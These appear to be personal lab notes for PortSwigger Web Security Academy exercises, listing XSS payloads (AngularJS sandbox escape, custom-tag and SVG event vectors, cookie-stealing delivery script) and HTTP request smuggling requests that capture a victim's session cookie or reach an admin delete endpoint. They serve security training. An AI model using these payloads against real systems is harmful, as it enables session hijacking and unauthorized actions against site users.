## XSS Vulnerabilities:
Test by: 
 - {{2+2}} if this works, try {{$on.constructor('alert(1)')()}}
 - \"-alert()}//
 - Custom tag: %3Cfood+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E%#x
   If this works, send to victim from Exploit server 
    <script>
    location='https://lab_id.web-security-academy.net/?search=%3Cfood+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E%#x';
    </script>

 - SVG tags. See what tags are allowed using Intruder and : e.g. \<svg>[[07_2 BURP Resources Tags |event tags]] \</svg>
 - <svg><animatetransform onbegin=alert()></svg>
 - </script><img src=1 onerror=alert(document.domain)>
 - \';alert()//
 - ${this.value}
 - Run Intruder with <{payload}> to 
`<iframe src="https://lab_id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.height='500px'>`


## HTTP Request Smuggling Vulnerabilities:
- ==Exploiting HTTP request smuggling to reveal front-end request rewriting== replace prefix with the following:
  prefix='''POST / HTTP/1.1
  Content-Length: 96
  Content-Type: application/x-www-form-urlencoded
  
  search='''
  
  Sending the above will cause the header similar to X-Forwarded-For to be revealed in the search like:
  
  \<section class=blog-header>
  \<h1>0 search results for 'POST / HTTP/1.1
  X-oEggzS-Ip: 125.236.242.113
  Host: lab_id.web'\</h1>
  \<hr>
  
  Then that Header can be used as follows:
  POST /admin/delete?username=carlos HTTP/1.1
  X-oEggzS-Ip: 127.0.0.1
  Content-Length: 148
  Content-Type: application/x-www-form-urlencoded
  
  search=
  
- ==HTTP/2 request smuggling via CRLF injection== 
  Recent searches on the home page reflects search word. Can use Response queue poisoning to reveal victim's cookie. 
  
  Craft a "kettled" request and add a new header e.g. Food: bar/r/nTransfer-Encoding: chunked. 
  
  Body of request:  
  0
  
  POST / HTTP/1.1
  Host: lab_id.web-security-academy.net
  Cookie: session==replace session cookie==
  Content-Length:880
  
  search=  
  After sending request, wait a while  before reloading the page which will include the whole GET request from the victim, including their  session cookie. If the session cookie is not included, increase Content-Length to an appropriate number - if too large, it will become an invalid request.
  After getting the cookie, use it to impersonate the victim user.

